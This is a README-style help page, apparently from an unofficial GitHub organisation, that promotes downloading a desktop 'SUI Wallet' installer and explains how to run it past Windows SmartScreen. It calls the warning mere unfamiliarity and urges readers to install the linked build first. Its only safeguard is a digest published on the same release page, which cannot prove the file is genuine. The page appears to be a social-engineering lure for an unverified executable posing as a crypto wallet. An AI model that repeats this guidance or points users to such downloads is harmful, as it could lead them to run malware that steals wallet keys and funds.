![SUI Wallet](assets/banner-article.png)

# Windows protected your PC: installing SUI Wallet past SmartScreen

SmartScreen is telling you the publisher is unrecognised, not that the file is malicious.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

The panel appears because Windows has not seen this file often enough to vouch for it, not because it found
anything wrong. Check the file's digest against the value published on the release page, then answer the
panel and let the installer run. A file that fails the digest should be deleted instead.

## What the panel is saying

SmartScreen is a reputation system. It records how many people have run a file and whether any of them
reported trouble, and it warns when a file is new or rare rather than when it is known to be harmful.

That distinction is the whole issue. A warning built from absence of history looks identical to a warning
built from evidence, and the reader gets the same blue box either way. What separates the two is not the
wording - it is whether the file you are holding is the one the project published.

## The two wordings

Windows uses more than one sentence for this situation. One reads Windows protected your PC, with the publisher shown as unknown; another blocks the file outright and hides the run option behind a link. Both are answers to the same question, and it is the reader who answers rather than the panel.

Both are answers to the same question and both offer the same escape, in different places. On Windows 10 the
option sits behind "More info"; on Windows 11 the layout moved but the choice did not, and the button that
runs the file is the one that is not the default.

## Checking the file first

This is the step that makes the panel answerable. The release notes publish a SHA-256 value beside each of the three assets, and PowerShell produces the same string for the file you downloaded, so the comparison is one value against another value and nothing else.

1. Open PowerShell in the folder that holds the download.
2. Run `Get-FileHash` against the file with the SHA256 algorithm.
3. Compare all 64 characters against the published value for the Windows asset.

A match means the file is the one the project built, and the panel is a reputation warning about a file
nobody has run yet. A mismatch means something else entirely: delete it and download again.

[verify you have the official SUI Wallet](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/how-to-verify-the-official-sui-wallet.md) takes the comparison step by step for all three platforms.

## The greyed-out button

Sometimes the button that would run the file is unavailable, with no explanation beyond the panel. That
usually means the file is marked as blocked by the browser or by a policy on the machine rather than by
SmartScreen's reputation.

For a download from a browser, the file's properties carry an unblock checkbox. On a managed machine, a
policy may forbid running executables from the Downloads folder at all, which is a conversation with
whoever administers it rather than a wallet problem.

## What happens once it runs

The installer places the application and creates a shortcut, and the wallet opens on its welcome screen. Nothing about the panel is remembered against the app: the next launch is an ordinary one, and the download that needed answering never comes up again.

If the app then fails to start, the panel was not the cause.
[SUI Wallet won't open after install](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-wont-open-after-install.md) covers the three start-up causes in the order worth
checking, and [How to install SUI Wallet on Windows](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/how-to-install-sui-wallet-on-windows.md) covers the install itself.

## When not to proceed

Three cases where the right move is to delete the file rather than answer the panel. The digest does not
match. The file came from anywhere other than the release page. Or the page that offered it also asked for
a seed phrase, a payment or a "verification" step.

In all three, the panel was the least of the warnings. The current release is on the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest), and installing
it is the fix for anything the older builds did.

## Why this keeps appearing

Every release is a new file with no history, so the panel can appear again after an update even though the
previous build ran without a prompt. That is expected rather than a regression, and it is the same check
each time: digest first, then answer.

A wallet is the one application where this habit pays. A modified installer runs before any wallet code
exists, so nothing inside the app can warn you afterwards - the digest is the only part of the download a
copy cannot fake.

## FAQ

### Why does Windows say it protected my PC when I run the SUI Wallet installer?

Because the file is new to SmartScreen's reputation data, not because it was found to be harmful. Verify the
digest, then choose the option that runs it.

### Is the file dangerous?

Not if it matches the published digest. If it does not match, it is not the file the project built, and it
should be deleted without running.

### Can I turn SmartScreen off permanently?

You can, and it is a bad trade: the panel is the only thing standing between a downloaded installer and a
machine, and the cost of answering it once per release is a few seconds.

### Why did the panel appear again after an update?

Each release is a new file with no run history, so the reputation starts over. The check is the same as the
first time.

### The button to run it is greyed out. What now?

Check the file's properties for a block flag from the browser, and check whether the machine's policy
forbids running executables from that folder. Neither is a wallet fault.

### Does this happen on Windows 11 too?

Yes, with different wording and a different layout. The decision is identical, and so is the advice to check
the digest first.
